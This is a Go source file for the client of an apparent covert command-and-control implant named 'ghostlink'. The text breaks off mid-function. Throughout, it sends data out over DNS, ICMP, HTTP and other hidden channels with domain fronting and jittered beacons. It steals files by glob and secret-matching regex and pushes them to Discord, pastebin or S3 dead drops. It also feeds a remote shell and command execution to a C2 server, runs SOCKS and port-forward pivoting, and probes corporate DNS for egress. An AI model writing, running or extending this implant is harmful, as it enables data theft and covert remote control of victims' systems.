package main

import (
	"crypto/sha256"
	"encoding/base64"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/byjanke/ghostlink/pkg/beacon"
	"github.com/byjanke/ghostlink/pkg/channel"
	"github.com/byjanke/ghostlink/pkg/crypto"
	"github.com/byjanke/ghostlink/pkg/encoder"
	"github.com/byjanke/ghostlink/pkg/exfil"
	"github.com/byjanke/ghostlink/pkg/forward"
	"github.com/byjanke/ghostlink/pkg/modules"
	multipathpkg "github.com/byjanke/ghostlink/pkg/multipath"
	"github.com/byjanke/ghostlink/pkg/protocol"
	"github.com/byjanke/ghostlink/pkg/shell"
	"github.com/byjanke/ghostlink/pkg/socks"
)

const (
	maxRetryAttempts = 5
	dnsReadDeadline  = 3 * time.Second
	dnsRecvBuffer    = 100
)

func main() {
	addr := flag.String("addr", "127.0.0.1:16353", "server address")
	channelType := flag.String("channel", "dns", "channel type: dns, http, icmp, ip_id, timing, packet_size, tcp_isn, websocket, doh")
	key := flag.String("key", "", "pre-shared key")
	ecdhe := flag.Bool("ecdhe", false, "ECDH key exchange")
	domain := flag.String("domain", "", "authoritative domain for DNS (enables DNS hierarchy mode)")
	execCmd := flag.String("exec", "", "execute a command and return output")
	doShell := flag.Bool("shell", false, "spawn interactive shell")
	fwd := flag.String("forward", "", "port forward: local_port:remote_host:remote_port")
	dnsRecon := flag.Bool("dns-recon", false, "DNS reconnaissance — test corporate DNS capabilities")
	hop := flag.String("hop", "", "comma-separated channels to hop between (e.g. dns,http,icmp)")
	frontDomain := flag.String("front", "", "domain fronting: use this CDN domain as TLS SNI")
	socksPort := flag.String("socks", "", "start SOCKS5 proxy on this port (e.g. 1080)")
	jitterProfile := flag.String("jitter", "", "beacon jitter profile: low_slow, office, night, burst, random")
	reconnect := flag.Bool("reconnect", false, "auto-reconnect on disconnection")
	maxRetries := flag.Int("retries", 10, "max reconnection attempts")

	exfilFile := flag.String("exfil", "", "fire-and-forget file exfiltration: path to file to exfiltrate")
	exfilGlob := flag.String("exfil-glob", "", "glob-based file exfiltration: pattern (e.g. /var/www/**/*.env)")
	exfilFilter := flag.String("exfil-filter", "", "content filter regex for exfil-glob (e.g. API_KEY|SECRET)")
	exfilMaxSize := flag.Int64("exfil-max", 10485760, "max file size for exfil-glob (default 10MB)")

	deadDropType := flag.String("dead-drop", "", "dead drop exfiltration: webhook, discord, pastebin, s3")
	deadDropURL := flag.String("dead-drop-url", "", "dead drop target URL/webhook")
	deadDropKey := flag.String("dead-drop-key", "", "dead drop API key (pastebin key or s3 access:secret)")
	deadDropBucket := flag.String("dead-drop-bucket", "", "S3 bucket name")
	deadDropRegion := flag.String("dead-drop-region", "us-east-1", "S3 region")

	multiPath := flag.String("multi-path", "", "multi-path exfiltration: comma-separated channels")
	multiPathFEC := flag.Bool("multi-path-fec", true, "enable FEC for multi-path exfiltration")

	canary := flag.Bool("canary", false, "enable canary/tripwire mode for channel disruption detection")

	flag.Parse()

	if *dnsRecon {
		runDNSRecon()
		return
	}

	if *deadDropType != "" {
		runDeadDropExfil(*deadDropType, *deadDropURL, *deadDropKey, *deadDropBucket, *deadDropRegion, *exfilFile, *exfilGlob, *exfilFilter, *exfilMaxSize)
		return
	}

	if *exfilFile != "" {
		runExfilSingle(*exfilFile, *channelType, *addr, *key, *ecdhe, *domain, *frontDomain, *hop, *canary)
		return
	}

	if *exfilGlob != "" {
		runExfilGlob(*exfilGlob, *exfilFilter, *exfilMaxSize, *channelType, *addr, *key, *ecdhe, *domain, *frontDomain, *hop, *canary)
		return
	}

	if *multiPath != "" && *exfilFile != "" {
		runMultiPathExfil(*multiPath, *exfilFile, *addr, *key, *ecdhe, *multiPathFEC)
		return
	}

	connectAndRun := func() {
		var ch channel.Channel
		var sessionKey []byte

		if *hop != "" {
			ch, sessionKey = connectMultiChannel(*hop, *addr, *key, *ecdhe)
		} else if *domain != "" && *channelType == "dns" {
			ch, sessionKey = connectAuthDNS(*domain, *key, *ecdhe, *addr)
		} else {
			ch, sessionKey = connectDirect(*channelType, *addr, *key, *ecdhe, *frontDomain)
		}
		if ch == nil {
			log.Fatal("failed to connect")
		}
		defer ch.Close()

		if *canary {
			startCanary(ch, *channelType, *addr, *key, *ecdhe, *frontDomain)
		}

		var cryptoSes *crypto.Session
		if sessionKey != nil {
			var err error
			cryptoSes, err = crypto.NewSession(sessionKey)
			if err != nil {
				log.Fatalf("crypto session: %v", err)
			}
		}

		if *execCmd != "" {
			runCommand(ch, cryptoSes, *execCmd)
			return
		}
		if *doShell {
			runShell(ch, cryptoSes)
			return
		}
		if *fwd != "" {
			runForward(ch, cryptoSes, *fwd)
			return
		}
		if *socksPort != "" {
			runSocks(ch, cryptoSes, *socksPort)
			return
		}

		if *jitterProfile != "" {
			runBeacon(ch, cryptoSes, *jitterProfile)
			return
		}

		fmt.Println("connected. type messages (Ctrl+C to quit):")
		sigCh := make(chan os.Signal, 1)
		signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
		<-sigCh
	}

	if *reconnect {
		for attempt := 0; attempt < *maxRetries; attempt++ {
			if attempt > 0 {
				delay := time.Duration(attempt*5) * time.Second
				if delay > 60*time.Second {
					delay = 60 * time.Second
				}
				fmt.Printf("[*] reconnecting in %v (attempt %d/%d)...\n", delay, attempt+1, *maxRetries)
				time.Sleep(delay)
			}
			func() {
				defer func() {
					if r := recover(); r != nil {
						fmt.Printf("[-] session panic: %v\n", r)
					}
				}()
				connectAndRun()
			}()
			fmt.Println("[-] connection lost")
		}
		fmt.Println("[-] max retries exceeded, exiting")
	} else {
		connectAndRun()
	}
}

func runExfilSingle(filePath, chType, addr, key string, ecdhe bool, domain, frontDomain, hop string, canary bool) {
	fmt.Printf("[exfil] reading %s...\n", filePath)
	entry, err := exfil.ReadFile(filePath)
	if err != nil {
		log.Fatalf("exfil: %v", err)
	}
	fmt.Printf("[exfil] %s — %d bytes\n", entry.Path, entry.Size)

	var ch channel.Channel
	var sessionKey []byte

	if hop != "" {
		ch, sessionKey = connectMultiChannel(hop, addr, key, ecdhe)
	} else if domain != "" && chType == "dns" {
		ch, sessionKey = connectAuthDNS(domain, key, ecdhe, addr)
	} else {
		ch, sessionKey = connectDirect(chType, addr, key, ecdhe, frontDomain)
	}
	if ch == nil {
		log.Fatal("failed to connect")
	}
	defer ch.Close()

	if canary {
		startCanary(ch, chType, addr, key, ecdhe, frontDomain)
	}

	var cryptoSes *crypto.Session
	if sessionKey != nil {
		var err error
		cryptoSes, err = crypto.NewSession(sessionKey)
		if err != nil {
			fmt.Printf("[-] crypto session: %v\n", err)
			cryptoSes = nil
		}
	}

	payload := fmt.Sprintf("%s\x00%d\x00%s", filepath.Base(entry.Path), entry.Size, string(entry.Content))
	msg := protocol.Message{Type: protocol.MsgExfilFile, Payload: []byte(payload)}
	sendMsg(ch, cryptoSes, msg)

	resp := recvMsg(ch, cryptoSes)
	if resp != nil && resp.Type == protocol.MsgExfilAck {
		fmt.Printf("[exfil] server ack: %s\n", string(resp.Payload))
	} else {
		fmt.Println("[exfil] data sent (fire-and-forget)")
	}
}

func runExfilGlob(pattern, filter string, maxSize int64, chType, addr, key string, ecdhe bool, domain, frontDomain, hop string, canary bool) {
	fmt.Printf("[exfil-glob] scanning %s...\n", pattern)
	if filter != "" {
		fmt.Printf("[exfil-glob] filter: %s\n", filter)
	}

	files, err := exfil.GlobExfil(pattern, filter, maxSize)
	if err != nil {
		log.Fatalf("exfil-glob: %v", err)
	}

	if len(files) == 0 {
		fmt.Println("[exfil-glob] no matching files")
		return
	}

	fmt.Printf("[exfil-glob] found %d files\n", len(files))
	for _, f := range files {
		if f.Error != nil {
			fmt.Printf("  [-] %s: %v\n", f.Path, f.Error)
		} else {
			fmt.Printf("  [+] %s — %d bytes\n", f.Path, len(f.Content))
		}
	}

	var ch channel.Channel
	var sessionKey []byte

	if hop != "" {
		ch, sessionKey = connectMultiChannel(hop, addr, key, ecdhe)
	} else if domain != "" && chType == "dns" {
		ch, sessionKey = connectAuthDNS(domain, key, ecdhe, addr)
	} else {
		ch, sessionKey = connectDirect(chType, addr, key, ecdhe, frontDomain)
	}
	if ch == nil {
		log.Fatal("failed to connect")
	}
	defer ch.Close()

	if canary {
		startCanary(ch, chType, addr, key, ecdhe, frontDomain)
	}

	var cryptoSes *crypto.Session
	if sessionKey != nil {
		var err error
		cryptoSes, err = crypto.NewSession(sessionKey)
		if err != nil {
			fmt.Printf("[-] crypto session: %v\n", err)
			cryptoSes = nil
		}
	}

	payload := exfil.EncodeFileList(files)
	msg := protocol.Message{Type: protocol.MsgExfilGlob, Payload: payload}
	sendMsg(ch, cryptoSes, msg)

	resp := recvMsg(ch, cryptoSes)
	if resp != nil && resp.Type == protocol.MsgExfilAck {
		fmt.Printf("[exfil-glob] server ack: %s\n", string(resp.Payload))
	} else {
		fmt.Println("[exfil-glob] data sent (fire-and-forget)")
	}
}

func runMultiPathExfil(channelsStr, filePath, addr, key string, ecdhe, fec bool) {
	entry, err := exfil.ReadFile(filePath)
	if err != nil {
		log.Fatalf("exfil: %v", err)
	}
	fmt.Printf("[multi-path] %s — %d bytes\n", filePath, entry.Size)

	types := strings.Split(channelsStr, ",")
	fmt.Printf("[multi-path] channels: %v\n", types)

	var dataShards, totalShards int
	if fec {
		dataShards, totalShards = encoder.OptimalFECParams(len(entry.Content))
	} else {
		dataShards = 1
		totalShards = 1
	}

	sender := multipathpkg.NewMultipathSender(dataShards, totalShards)

	for _, t := range types {
		t = strings.TrimSpace(t)
		ch := channel.NewChannel(channel.ChannelType(t))
		if ch == nil {
			fmt.Printf("[-] unknown channel: %s\n", t)
			continue
		}
		cAddr := addr
		if (t == "http" || t == "websocket" || t == "doh") && !strings.HasPrefix(cAddr, "http") {
			cAddr = "http://" + cAddr
		}
		if err := ch.Connect(cAddr); err != nil {
			fmt.Printf("[-] %s: %v\n", t, err)
			continue
		}
		var ses *crypto.Session
		if key != "" {
			h := sha256.Sum256([]byte(key))
			var err error
			ses, err = crypto.NewSession(h[:])
			if err != nil {
				fmt.Printf("[-] crypto session: %v\n", err)
				ses = nil
			}
		}
		sender.AddPath(ch, ses)
		fmt.Printf("[+] %s connected\n", t)
	}

	if sender.PathCount() == 0 {
		log.Fatal("no channels could connect")
	}

	fmt.Printf("[*] %d channels, FEC %d/%d\n", sender.PathCount(), dataShards, totalShards)

	if err := sender.Send(entry.Content); err != nil {
		log.Fatalf("multi-path send: %v", err)
	}

	fmt.Println("[multi-path] exfiltration complete")
}

func runDeadDropExfil(ddType, ddURL, ddKey, ddBucket, ddRegion, exfilFile, exfilGlob, exfilFilter string, exfilMaxSize int64) {
	cfg := channel.DeadDropConfig{
		Type:    channel.ParseDeadDropType(ddType),
		URL:     ddURL,
		APIKey:  ddKey,
		Bucket:  ddBucket,
		Region:  ddRegion,
		MaxSize: int(exfilMaxSize),
	}

	dd := channel.NewDeadDrop(cfg)

	if exfilFile != "" {
		fmt.Printf("[dead-drop] %s -> %s\n", exfilFile, ddType)
		entry, err := exfil.ReadFile(exfilFile)
		if err != nil {
			log.Fatalf("exfil: %v", err)
		}
		metadata := fmt.Sprintf("%s_%d", filepath.Base(entry.Path), time.Now().Unix())
		if err := dd.Send(entry.Content, metadata); err != nil {
			log.Fatalf("dead-drop: %v", err)
		}
		fmt.Printf("[dead-drop] %d bytes sent to %s\n", entry.Size, ddType)
		return
	}

	if exfilGlob != "" {
		fmt.Printf("[dead-drop] %s -> %s\n", exfilGlob, ddType)
		files, err := exfil.GlobExfil(exfilGlob, exfilFilter, exfilMaxSize)
		if err != nil {
			log.Fatalf("glob: %v", err)
		}
		for _, f := range files {
			if f.Error != nil {
				fmt.Printf("  [-] %s: %v\n", f.Path, f.Error)
				continue
			}
			metadata := fmt.Sprintf("%s_%d", filepath.Base(f.Path), time.Now().UnixNano())
			if err := dd.Send(f.Content, metadata); err != nil {
				fmt.Printf("  [-] %s: %v\n", f.Path, err)
				continue
			}
			fmt.Printf("  [+] %s — %d bytes\n", f.Path, len(f.Content))
		}
		fmt.Printf("[dead-drop] exfiltration complete\n")
		return
	}

	log.Fatal("dead-drop requires -exfil or -exfil-glob")
}

func startCanary(ch channel.Channel, fallbackChType, addr, key string, ecdhe bool, frontDomain string) {
	cfg := channel.CanaryConfig{
		CheckInterval:   10 * time.Second,
		FailureCount:    5,
		SilenceDuration: 24 * time.Hour,
		SelfDestruct:    false,
		OnAlert: func(state channel.CanaryState) {
			switch state {
			case channel.CanaryDegrade:
				fmt.Println("[canary] switching channel...")
			case channel.CanarySilent:
				fmt.Println("[canary] going silent for 24h...")
			case channel.CanaryDead:
				fmt.Println("[canary] channel dead")
				os.Exit(1)
			}
		},
	}

	cc := channel.NewChannelCanary(cfg)
	cc.Attach(ch)
	cc.Start()
}

func connectMultiChannel(channels, addr, key string, ecdhe bool) (channel.Channel, []byte) {
	types := strings.Split(channels, ",")
	fmt.Printf("ghostlink hop | channels: %v | %s\n", types, addr)

	mc := channel.NewMultiChannel(30 * time.Second)

	for _, t := range types {
		t = strings.TrimSpace(t)
		ch := channel.NewChannel(channel.ChannelType(t))
		if ch == nil {
			fmt.Printf("[-] unknown channel: %s\n", t)
			continue
		}
		cAddr := addr
		if (t == "http" || t == "websocket" || t == "doh") && !strings.HasPrefix(cAddr, "http") {
			cAddr = "http://" + cAddr
		}
		if err := ch.Connect(cAddr); err != nil {
			fmt.Printf("[-] %s: %v\n", t, err)
			continue
		}
		mc.AddChannel(ch)
		fmt.Printf("[+] %s connected\n", t)
	}

	activeCount := mc.ChannelCount()
	if activeCount == 0 {
		log.Fatal("no channels could connect")
	}
	fmt.Printf("[*] %d channels active, rotating every 30s\n", activeCount)

	mc.SetOnSwitch(func(from, to channel.ChannelType) {
		fmt.Printf("[hop] %s -> %s\n", from, to)
	})
	mc.StartRotation()

	var sessionKey []byte
	if ecdhe {
		sk, err := channel.ClientHandshake(mc)
		if err != nil {
			fmt.Printf("[-] ECDHE: %v (continuing without encryption)\n", err)
		} else {
			sessionKey = sk
			fmt.Println("[+] ECDH key exchange complete")
		}
	} else if key != "" {
		h := sha256.Sum256([]byte(key))
		sessionKey = h[:]
	}

	return mc, sessionKey
}

func connectAuthDNS(domain, key string, ecdhe bool, fallbackAddr string) (channel.Channel, []byte) {
	fmt.Printf("ghostlink auth-dns client | domain: %s\n", domain)

	resolver := fallbackAddr
	if resolver == "" || resolver == "127.0.0.1:16353" {
		resolver = "8.8.8.8:53"
	}

	conn, err := net.Dial("udp", resolver)
	if err != nil {
		log.Fatalf("dns resolver: %v", err)
	}

	ch := &authDNSClientChannel{
		conn:     conn.(*net.UDPConn),
		domain:   domain,
		resolver: resolver,
		recvCh:   make(chan []byte, dnsRecvBuffer),
	}

	fmt.Println("[*] tunneling through DNS hierarchy")
	return ch, nil
}

type authDNSClientChannel struct {
	conn     *net.UDPConn
	domain   string
	resolver string
	recvCh   chan []byte
}

func (c *authDNSClientChannel) Info() channel.ChannelInfo {
	return channel.ChannelInfo{
		Type:        channel.DNSChannel,
		Name:        "Authoritative DNS",
		Description: "Tunnels through real DNS hierarchy via authoritative nameserver",
		Capability:  0.95,
	}
}

func (c *authDNSClientChannel) Connect(addr string) error { return nil }
func (c *authDNSClientChannel) Close() error              { return c.conn.Close() }

func (c *authDNSClientChannel) Send(data []byte) error {
	msg := buildAuthDNSQuery(data, c.domain)
	_, err := c.conn.Write(msg)
	return err
}

func (c *authDNSClientChannel) Recv() ([]byte, error) {
	for attempt := 0; attempt < maxRetryAttempts; attempt++ {
		poll := buildAuthDNSQuery([]byte{}, c.domain)
		_, err := c.conn.Write(poll)
		if err != nil {
			return nil, err
		}

		c.conn.SetReadDeadline(time.Now().Add(dnsReadDeadline))
		buf := make([]byte, 1500)
		n, _, err := c.conn.ReadFromUDP(buf)
		if err != nil {
			if attempt < maxRetryAttempts-1 {
				continue
			}
			return nil, err
		}

		resp := buf[:n]
		if len(resp) < 12 {
			continue
		}

		anCount := int(resp[6])<<8 | int(resp[7])
		if anCount == 0 {
			continue
		}

		data := parseDNSTXTResponse(resp)
		if data != nil {
			return data, nil
		}
	}

	return nil, fmt.Errorf("no data after 5 attempts")
}

func parseDNSTXTResponse(resp []byte) []byte {
	n := len(resp)
	offset := 12
	for offset < n && resp[offset] != 0 {
		labelLen := int(resp[offset])
		if labelLen&0xC0 == 0xC0 {
			offset += 2
			break
		}
		offset += labelLen + 1
	}
	if offset < n && resp[offset] == 0 {
		offset++
	}
	offset += 4

	anCount := int(resp[6])<<8 | int(resp[7])
	for i := 0; i < anCount && offset+10 < n; i++ {
		if resp[offset]&0xC0 == 0xC0 {
			offset += 2
		} else {
			for offset < n && resp[offset] != 0 {
				labelLen := int(resp[offset])
				if labelLen&0xC0 == 0xC0 {
					offset += 2
					break
				}
				offset += labelLen + 1
			}
			if offset < n && resp[offset] == 0 {
				offset++
			}
		}
		if offset+10 > n {
			break
		}
		rtype := int(resp[offset])<<8 | int(resp[offset+1])
		offset += 2
		offset += 2
		offset += 4
		rdlen := int(resp[offset])<<8 | int(resp[offset+1])
		offset += 2

		if rtype == 16 && rdlen > 0 && offset+rdlen <= n {
			rdata := resp[offset : offset+rdlen]
			if len(rdata) > 1 {
				txtLen := int(rdata[0])
				if txtLen+1 <= len(rdata) {
					txt := string(rdata[1 : txtLen+1])
					decoded, err := base64.RawURLEncoding.DecodeString(txt)
					if err == nil {
						return decoded
					}
				}
			}
		}
		offset += rdlen
	}
	return nil
}

func buildAuthDNSQuery(data []byte, domain string) []byte {
	encoded := base64.RawURLEncoding.EncodeToString(data)
	var fqdn string
	if encoded == "" {
		fqdn = "poll." + domain
	} else {
		fqdn = encoded + "." + domain
	}

	var msg []byte
	msg = append(msg, 0x00, 0x01)
	msg = append(msg, 0x01, 0x00)
	msg = append(msg, 0x00, 0x01)
	msg = append(msg, 0x00, 0x00)
	msg = append(msg, 0x00, 0x00)
	msg = append(msg, 0x00, 0x00)
	for _, label := range strings.Split(fqdn, ".") {
		if label == "" {
			continue
		}
		msg = append(msg, byte(len(label)))
		msg = append(msg, []byte(label)...)
	}
	msg = append(msg, 0x00)
	msg = append(msg, 0x00, 0x10)
	msg = append(msg, 0x00, 0x01)
	return msg
}

func connectDirect(chType, addr, key string, ecdhe bool, frontDomain string) (channel.Channel, []byte) {
	fmt.Printf("ghostlink connect | %s | %s", chType, addr)
	if frontDomain != "" {
		fmt.Printf(" | front: %s", frontDomain)
	}
	fmt.Println()

	ch := channel.NewChannel(channel.ChannelType(chType))
	if ch == nil {
		log.Fatalf("unknown channel: %s", chType)
	}

	if chType == "http" && frontDomain != "" {
		channel.SetHTTPFrontDomain(ch, frontDomain)
	}

	connectAddr := addr
	if (chType == "http" || chType == "websocket") && !strings.HasPrefix(connectAddr, "http") {
		connectAddr = "http://" + connectAddr
	}
	if err := ch.Connect(connectAddr); err != nil {
		log.Fatalf("connect: %v", err)
	}

	var sessionKey []byte
	if ecdhe {
		sk, err := channel.ClientHandshake(ch)
		if err != nil {
			log.Fatalf("handshake: %v", err)
		}
		sessionKey = sk
		fmt.Println("[+] ECDH key exchange complete")
	} else if key != "" {
		h := sha256.Sum256([]byte(key))
		sessionKey = h[:]
	}

	return ch, sessionKey
}

func runCommand(ch channel.Channel, cryptoSes *crypto.Session, cmd string) {
	fmt.Printf("[*] executing: %s\n", cmd)

	msg := protocol.Message{Type: protocol.MsgCmdReq, Payload: []byte(cmd)}
	sendMsg(ch, cryptoSes, msg)

	resp := recvMsg(ch, cryptoSes)
	if resp != nil && resp.Type == protocol.MsgCmdRes {
		fmt.Print(string(resp.Payload))
	} else if resp != nil {
		fmt.Printf("[recv] %s\n", string(resp.Payload))
	}
}

func runShell(ch channel.Channel, cryptoSes *crypto.Session) {
	sh, err := shell.Spawn()
	if err != nil {
		log.Fatalf("shell: %v", err)
	}
	defer sh.Close()

	fmt.Println("[*] shell spawned, connected to C2")

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := sh.ReadStdout(buf)
			if err != nil {
				return
			}
			msg := protocol.Message{Type: protocol.MsgShellStdout, Payload: buf[:n]}
			sendMsg(ch, cryptoSes, msg)
		}
	}()

	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := sh.ReadStderr(buf)
			if err != nil {
				return
			}
			msg := protocol.Message{Type: protocol.MsgShellStderr, Payload: buf[:n]}
			sendMsg(ch, cryptoSes, msg)
		}
	}()

	go func() {
		for {
			msg := recvMsg(ch, cryptoSes)
			if msg == nil {
				return
			}
			if msg.Type == protocol.MsgShellStdin {
				sh.WriteStdin(msg.Payload)
			}
		}
	}()

	<-sigCh
	fmt.Println("\n[*] shell session closed")
}

func runDNSRecon() {
	fmt.Println("=== Ghostlink DNS Reconnaissance ===")
	fmt.Println()

	resolvers := []struct {
		name string
		addr string
	}{
		{"System DNS", ""},
		{"Google", "8.8.8.8:53"},
		{"Cloudflare", "1.1.1.1:53"},
	}

	domains := []struct {
		name string
		fqdn string
	}{
		{"Internal (acme.local)", "acme.local"},
		{"External (google.com)", "google.com"},
		{"External (github.com)", "github.com"},
	}

	recordTypes := []struct {
		name  string
		qtype uint16
	}{
		{"A", 1},
		{"TXT", 16},
		{"CNAME", 5},
		{"MX", 15},
	}

	for _, r := range resolvers {
		fmt.Printf("[*] Resolver: %s\n", r.name)
		resolverAddr := r.addr

		for _, d := range domains {
			fmt.Printf("    %-30s ", d.name)
			addrs, err := resolveDNS(resolverAddr, d.fqdn, 1)
			if err != nil || len(addrs) == 0 {
				fmt.Print("x unresolved\n")
				continue
			}
			fmt.Print("+ resolved\n")
		}

		if resolverAddr != "" {
			fmt.Printf("    %-30s ", "Direct external DNS")
			addrs, err := resolveDNS(resolverAddr, "google.com", 1)
			if err == nil && len(addrs) > 0 {
				fmt.Print("+ reachable (external DNS allowed)\n")
			} else {
				fmt.Print("x blocked (may need internal DNS only)\n")
			}
		}
		fmt.Println()
	}

	fmt.Println("[*] Record type availability (via 8.8.8.8):")
	for _, rt := range recordTypes {
		fmt.Printf("    %-6s ", rt.name)
		_, err := resolveDNS("", "google.com", rt.qtype)
		if err == nil {
			fmt.Print("+ allowed\n")
		} else {
			fmt.Printf("x %v\n", err)
		}
	}

	fmt.Println()
	fmt.Println("[*] Recommendations:")
	addrs, err := resolveDNS("8.8.8.8:53", "google.com", 1)
	canDirect := err == nil && len(addrs) > 0

	_, txtErr := resolveDNS("", "google.com", 16)

	fmt.Printf("    External DNS direct access:  ")
	if canDirect {
		fmt.Println("YES — use -channel dns (direct mode)")
	} else {
		fmt.Println("NO  — use -domain (auth DNS mode)")
	}

	fmt.Printf("    TXT records allowed:         ")
	if txtErr == nil {
		fmt.Println("YES — standard DNS tunneling works")
	} else {
		fmt.Println("NO  — use CNAME/MX records or -channel http/icmp")
	}

	fmt.Printf("    Recommended channel:         ")
	if canDirect {
		fmt.Println("dns (direct)")
	} else if txtErr == nil {
		fmt.Println("dns (auth DNS via TXT)")
	} else {
		fmt.Println("http or icmp")
	}
}

func resolveDNS(server, domain string, qtype uint16) ([]string, error) {
	if server == "" {
		addrs, err := net.LookupHost(domain)
		if err != nil {
			return nil, err
		}
		return addrs, nil
	}

	msg := buildDNSQueryMsg(domain, qtype)

	conn, err := net.Dial("udp", server)
	if err != nil {
		return nil, fmt.Errorf("dial %s: %w", server, err)
	}
	defer conn.Close()

	_, err = conn.Write(msg)
	if err != nil {
		return nil, fmt.Errorf("write: %w", err)
	}

	conn.SetReadDeadline(time.Now().Add(dnsReadDeadline))
	buf := make([]byte, 1500)
	n, err := conn.Read(buf)
	if err != nil {
		return nil, fmt.Errorf("read: %w", err)
	}

	return parseDNSAnswers(buf[:n]), nil
}

func buildDNSQueryMsg(domain string, qtype uint16) []byte {
	var msg []byte
	msg = append(msg, byte(time.Now().UnixNano()>>8), byte(time.Now().UnixNano()))
	msg = append(msg, 0x01, 0x00)
	msg = append(msg, 0x00, 0x01)
	msg = append(msg, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)

	for _, label := range strings.Split(domain, ".") {
		if label == "" {
			continue
		}
		msg = append(msg, byte(len(label)))
		msg = append(msg, []byte(label)...)
	}
	msg = append(msg, 0x00)
	msg = append(msg, byte(qtype>>8), byte(qtype&0xFF))
	msg = append(msg, 0x00, 0x01)
	return msg
}

func parseDNSAnswers(resp []byte) []string {
	if len(resp) < 12 {
		return nil
	}
	anCount := int(resp[6])<<8 | int(resp[7])
	if anCount == 0 {
		return nil
	}

	var results []string
	offset := 12

	for offset < len(resp) && resp[offset] != 0 {
		labelLen := int(resp[offset])
		if labelLen&0xC0 == 0xC0 {
			offset += 2
			break
		}
		offset += labelLen + 1
	}
	if offset < len(resp) && resp[offset] == 0 {
		offset++
	}
	offset += 4

	for i := 0; i < anCount && offset+10 < len(resp); i++ {
		if resp[offset]&0xC0 == 0xC0 {
			offset += 2
		} else {
			for offset < len(resp) && resp[offset] != 0 {
				labelLen := int(resp[offset])
				if labelLen&0xC0 == 0xC0 {
					offset += 2
					break
				}
				offset += labelLen + 1
			}
			if offset < len(resp) && resp[offset] == 0 {
				offset++
			}
		}
		if offset+10 > len(resp) {
			break
		}
		rtype := int(resp[offset])<<8 | int(resp[offset+1])
		offset += 2
		offset += 2
		rdlen := int(resp[offset+2])<<8 | int(resp[offset+3])
		offset += 4

		if rtype == 1 && rdlen == 4 && offset+4 <= len(resp) {
			results = append(results, fmt.Sprintf("%d.%d.%d.%d",
				resp[offset], resp[offset+1], resp[offset+2], resp[offset+3]))
		}
		offset += rdlen
	}
	return results
}

func runForward(ch channel.Channel, cryptoSes *crypto.Session, fwdSpec string) {
	parts := strings.SplitN(fwdSpec, ":", 3)
	if len(parts) != 3 {
		log.Fatalf("forward format: local_port:remote_host:remote_port (e.g. 1080:10.0.0.5:3389)")
	}

	localAddr := "127.0.0.1:" + parts[0]
	remoteAddr := parts[1] + ":" + parts[2]

	fmt.Printf("[*] port forward: %s -> %s\n", localAddr, remoteAddr)

	tun := forward.NewTunnel(1, localAddr, remoteAddr)
	tun.SetCallbacks(
		func(tid, cid uint32, data []byte) {
			payload := fmt.Sprintf("%d:%s", cid, string(data))
			msg := protocol.Message{Type: protocol.MsgFwdData, StreamID: tid, Payload: []byte(payload)}
			sendMsg(ch, cryptoSes, msg)
		},
		func(tid, cid uint32) {
			payload := fmt.Sprintf("%d", cid)
			msg := protocol.Message{Type: protocol.MsgFwdClose, StreamID: tid, Payload: []byte(payload)}
			sendMsg(ch, cryptoSes, msg)
		},
	)

	if err := tun.Listen(); err != nil {
		log.Fatalf("forward: %v", err)
	}

	go func() {
		for {
			msg := recvMsg(ch, cryptoSes)
			if msg == nil {
				return
			}
			if msg.Type == protocol.MsgFwdData {
				handleFwdData(*msg, tun)
			}
		}
	}()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh
	tun.Close()
}

func handleFwdData(msg protocol.Message, tun *forward.Tunnel) {
	parts := strings.SplitN(string(msg.Payload), ":", 2)
	if len(parts) != 2 {
		return
	}
	var cid uint32
	fmt.Sscanf(parts[0], "%d", &cid)

	if _, err := tun.ReadConn(cid, make([]byte, 1)); err != nil {
		if conn, err := tun.DialAndConnect(cid); err == nil {
			go func() {
				buf := make([]byte, 32768)
				for {
					n, err := conn.Read(buf)
					if err != nil {
						return
					}
					_ = n
				}
			}()
		}
	}

	tun.WriteToConnDirect(cid, []byte(parts[1]))
}

func runSocks(ch channel.Channel, cryptoSes *crypto.Session, port string) {
	listenAddr := "127.0.0.1:" + port
	fmt.Printf("[*] SOCKS5 proxy on %s\n", listenAddr)

	tun := socks.NewTunnel(listenAddr)
	tun.SetCallbacks(
		func(connID uint32, addr string) {
			msg := protocol.Message{
				Type:     protocol.MsgSocksConnect,
				StreamID: connID,
				Payload:  []byte(addr),
			}
			sendMsg(ch, cryptoSes, msg)
			fmt.Printf("[socks] #%d -> %s\n", connID, addr)
		},
		func(connID uint32, data []byte) {
			msg := protocol.Message{
				Type:     protocol.MsgSocksData,
				StreamID: connID,
				Payload:  data,
			}
			sendMsg(ch, cryptoSes, msg)
		},
		func(connID uint32) {
			msg := protocol.Message{
				Type:     protocol.MsgSocksClose,
				StreamID: connID,
			}
			sendMsg(ch, cryptoSes, msg)
		},
	)

	if err := tun.Listen(); err != nil {
		log.Fatalf("socks: %v", err)
	}

	go func() {
		for {
			msg := recvMsg(ch, cryptoSes)
			if msg == nil {
				return
			}
			switch msg.Type {
			case protocol.MsgSocksData:
				tun.WriteToConn(msg.StreamID, msg.Payload)
			case protocol.MsgSocksClose:
				tun.CloseConn(msg.StreamID)
			}
		}
	}()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh
	tun.Close()

}

func runBeacon(ch channel.Channel, cryptoSes *crypto.Session, profile string) {
	j := beacon.New(beacon.ParseProfile(profile))
	fmt.Printf("[*] beacon mode: %s\n", profile)

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	modRegistry := modules.NewRegistry()

	go func() {
		for {
			msg := recvMsg(ch, cryptoSes)
			if msg == nil {
				return
			}
			switch msg.Type {
			case protocol.MsgCmdReq:
				output, err := shell.ExecCommand(string(msg.Payload))
				if err != nil {
					output = []byte(fmt.Sprintf("error: %v", err))
				}
				resp := protocol.Message{Type: protocol.MsgCmdRes, Payload: output}
				sendMsg(ch, cryptoSes, resp)
			case protocol.MsgModuleExec:
				go handleModuleExec(ch, cryptoSes, modRegistry, *msg)
